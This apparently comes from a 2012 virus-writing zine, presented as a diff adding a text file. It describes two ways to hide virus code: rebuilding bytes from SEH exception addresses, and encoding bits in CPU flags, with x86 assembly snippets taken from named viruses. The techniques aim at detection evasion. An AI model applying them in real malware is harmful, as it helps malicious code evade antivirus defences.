@@ -1,0 +1,282 @@
+
+         ********************************************************
+          The flag of virtual space: Nonstandard Code Recreation
+                                   by hh86 & Second Part To Hell
+         ********************************************************
+
+
+
+  1) Introduction
+
+  2) Obfuscation by SEH
+
+  3) Code reconstruction using FLAGs
+
+  4) Conclusion
+
+
+
+
+
+
+
+
+1) Introduction
+
+We  consider  non-standard  ways to reconstruct the information of the code.
+
+Usually,  encrypted viruses use arithmetic algorithms  to reconstruct the native
+form of itself. The simplest method is a symmetric XOR encryption, but also very
+advanced  techniques  have  been created  (for  instance,  "Advanced polymorphic
+engine construction" by The Mental Driller).
+
+In any  of  those cases,  the required  information  is represented  as actively
+accessable objects such as tables of data or self-modifying code at runtime.
+
+
+Very simple XOR encryption:
+
+       mov     ecx, 0x5
+       mov     eax, newcode
+   EncryptMore:
+       xor     byte[eax+ecx-1], 42d
+       loop    EncryptMore
+
+   newcode:
+       db      0x92, 0x7C, 0x72, 0x4F, 0x58   
+
+
+
+Very simple runtime code-modification:
+
+       mov     dword[newcode], 0x655856B8
+       mov     byte[newcode+4], 0x72
+
+   newcode:
+       db      0x0, 0x0, 0x0, 0x0, 0x0   
+
+
+We see, the actual  information is always  present in form of code  and/or data.
+Even if we improve these concept by  introducing multi-layer encryption or PRIDE
+(Pseudo-Random Index DEcryption), the actual information is always hidden in the
+code and data.
+
+Now the  question appears:  Can we hide our  information in other,  more obscure
+ways? Yes, we can - and in this text we show some ways how we could do this.
+
+The first method  is implemented in  W32.POSEY by hh86.  It can  reconstruct the
+information  using a geometrical approach:  It calculates the distance between a
+specific  position in  the code and a constant  position (more concrete, between
+the position of an exception table and an exception that is triggered).
+
+The  second  method is  implemented in  W32.Filly  by SPTH.  It reconstructs the
+information using minor  side-effects of a well-defined  instruction flow  (more
+concrete, it uses flags defined by a specific code flow).
+
+These two examples should help  to free your mind about finding new container of
+information.
+
+
+
+
+
+2) Obfuscation by SEH
+
+In its simplicity this idea is beautiful.
+When the  code is  mapped into a virtual memory space, we can access the address
+where it is  running  in the space in many ways.  It is so great we can actually
+handle this address in its numeric form.  One of the ways to get this address is
+using SEH.  When an  exception  occurs, information of  the exception address is
+sent to the Exception Handler procedure throught the EXCEPTION_RECORD structure.
+We will use this address supplied to SEH to rebuild the virus code. 
+
+How we do it
+
+I decided to go using a table-like piece of code made of breakpoint INT 3, it is
+0x100 bytes long. The idea  basically is we install a SEH  handler, and we start
+calling exceptions from the table, but not randomly, though, why?  Here is  why:
+when  the  exception  happens, we  pick up the  address in  the  SEH  procedure,
+substract  from  it  the  beginning of the interruption table, the result is the
+code byte.
+
+This is how the SEH looks like:
+
+        call    seh
+        pop     ecx
+        pop     edx
+        pop     eax
+        pop     eax
+        push    ecx
+        add     eax, 7fh
+        mov     edx, dword ptr [edx + EXCEPTION_RECORD.ExceptionAddress]
+        sub     edx, offset itbl                ;get code byte
+        mov     ecx, dword ptr [eax + CONTEXT.regEdi - 7fh]
+        mov     byte ptr [ecx], dl              ;store code byte
+        inc     dword ptr [eax + CONTEXT.regEdi - 7fh]
+        mov     ecx, dword ptr [eax + CONTEXT.regEsp - 7fh]
+        mov     ecx, dword ptr [ecx]
+        mov     dword ptr [eax + CONTEXT.regEip - 7fh], ecx
+        xor     eax, eax
+        ret
+
+seh:    xor     eax, eax
+        push    dword ptr fs:[eax]
+        mov     dword ptr fs:[eax], esp
+        mov     edi, offset code
+        call    i6
+        call    i4
+        call    i8
+        call    i1
+        call    i0
+        call    i2
+        call    i9
+        call    i3
+        call    i7
+        call    i11
+        call    i5
+        call    i12
+        ... more CALLs...
+        jmp     code
+i0:     int     3
+i1:     int     3
+i2:     int     3
+i3:     int     3
+i4:     int     3
+i5:     int     3
+i6:     int     3
+i7:     int     3
+i8:     int     3
+i9:     int     3
+i10:    int     3
+i11:    int     3
+i12:    int     3
+        ... more INTs...
+code:
+        ... code space ...
+
+
+The result should be: 0x060408010002090307110512.
+It does not takes too much time to regenerate the whole code  (it depends on how
+big is your code, I tried the  smallest, since I  don't  care about detection in
+this code, obfuscation is only generated once, thus code does not replicates the
+engine, it is lightweight).  
+
+
+64-bit posey?
+
+In 64-bit platform it would be harder because we need to create a table of SEHs,
+and different SE Handler procedure.  See W64.Haley for an example of  using  SEH
+EPO in PE32+ (x86-64 architecture). So, maybe that's for some other time. :)
+
+
+
+
+
+3) Code reconstruction using FLAGs
+
+x86 instructions can  activly manipulate registers,  memory and the stack.  As a
+side effect of many instructions,  the flags are changed depending on the result
+of the manipulation.
+
+Now instead of  constructing arithmetic/logic  algorithms using these  "actively
+manipulateable"  objects,  one could  use the  "side effects"  of  instructions,
+namely the flags.
+
+The idea is simple:Encode the information of your virus in flags by constructing
+a  code-flow  that  creates  a  well-defined  flag  setting. Then read  the flag
+register,  extract  the  information  and  write  it  to a memory  which will be
+executed in the end.
+
+In fact,  the  flags  are saved  in the flag  register,  which is  16bit in  x86
+architecture (not taking account of EFLAGS and RFLAGS,  which fill the 32bit and
+64bit register).
+
+The lower byte of the flag register contains 8 entries:
+
+     0       CF       Carry flag
+     1       1        Reserved
+     2       PF       Parity flag
+     3       0        Reserved
+     4       AF       Adjust flag
+     5       0        Reserved
+     6       ZF       Zero flag
+     7       SF       Sign flag
+
+If we  want  to  recreate  our  virus in this  register, we  have to  be able to
+manipulate every single used information-bit independent of others.  We see that
+we cant use the  reserved entries,  but we also can not use ZF  -  it can not be
+manipulated independent of all others.
+
+So we have a container for 4bit of information (a nibble): S00A'0P1C
+
+Next thing - construct a  code-flow that defines a nibble of the virus. Two ways
+come to  my mind:  deterministic algorithm  where you  calculate how  the result
+result  should be;  or a  non-deterministic  algorithm,  where you  execute some
+random  instructions  and  compare  the flags with  the information  you want to
+encode.  For my Win32.Filly  (in valhalla#2)  I have  used a  semi-deterministic
+algorithm.  Filly defines some general rules of  combinations of an  instruction
+set, it executes random combinations and compares the flag configuration. For
+more details, see the documented source-code.
+
+The codeflow could look like this:
+
+     004025AC   . BB 42089028    MOV EBX,28900842
+     004025B1   . 43             INC EBX
+     004025B2   . BA 01D29A80    MOV EDX,809AD201
+     004025B7   . B9 665345C1    MOV ECX,C1455366
+     004025BC   . D3C2           ROL EDX,CL
+     004025BE   . 9F             LAHF
+     004025BF   . 8827           MOV BYTE PTR DS:[EDI],AH
+     004025C1   . 47             INC EDI
+     004025C2   . BB 93EEB585    MOV EBX,85B5EE93
+     004025C7   . C1E3 35        SHL EBX,35
+     004025CA   . B8 4F69B4C0    MOV EAX,C0B4694F
+     004025CF   . 40             INC EAX
+     004025D0   . 9F             LAHF
+     004025D1   . 86C4           XCHG AH,AL
+     004025D3   . AA             STOS BYTE PTR ES:[EDI]
+     004025D4   . BA FA097F82    MOV EDX,827F09FA
+     004025D9   . B9 A6C04C72    MOV ECX,724CC0A6
+     004025DE   . 39CA           CMP EDX,ECX
+     004025E0   . B8 B8A67742    MOV EAX,4277A6B8
+     004025E5   . 3F             AAS
+     004025E6   . B9 7F666F09    MOV ECX,96F667F
+     004025EB   . 49             DEC ECX
+     004025EC   . 9F             LAHF
+     004025ED   . 88E0           MOV AL,AH
+     004025EF   . AA             STOS BYTE PTR ES:[EDI]
+     00402623   . BB B15CD2C5    MOV EBX,C5D25CB1
+     00402628   . C1FB F4        SAR EBX,0F4
+     0040262B   . BB 420E1E6D    MOV EBX,6D1E0E42
+     00402630   . 43             INC EBX
+     00402631   . 9C             PUSHFD
+     00402632   . 5A             POP EDX
+     00402633   . 8817           MOV BYTE PTR DS:[EDI],DL
+     00402635   . 47             INC EDI
+
+This code contains 4 nibble of information, which are 2 bytes of our code.
+
+
+For getting the information  from flags to registers, one can use LAHF or PUSHFD
+instruction.
+
+In  the  end we have  to  extract the  4 bit of information  and construct  full
+information bytes in the memory; then execute the memory to run the code.
+
+To  sum  up,  we have  our  virus  constructed  in  the shadow  of an  overlayed
+instruction flow, and this is beautiful...
+
+
+
+
+
+4) Conclusion
+
+We presented these  new techniques  to merge  information,  which is not  simple
+represented  by some (obfuscated)  code or data.  We expect there  exist several
+other  nonstandard  information  container  useful for our code,  and uncovering
+them is a challange for some other creative nights :-)
+
+
+                                                  hh86 & Second Part To Hell
+                                                               February 2012
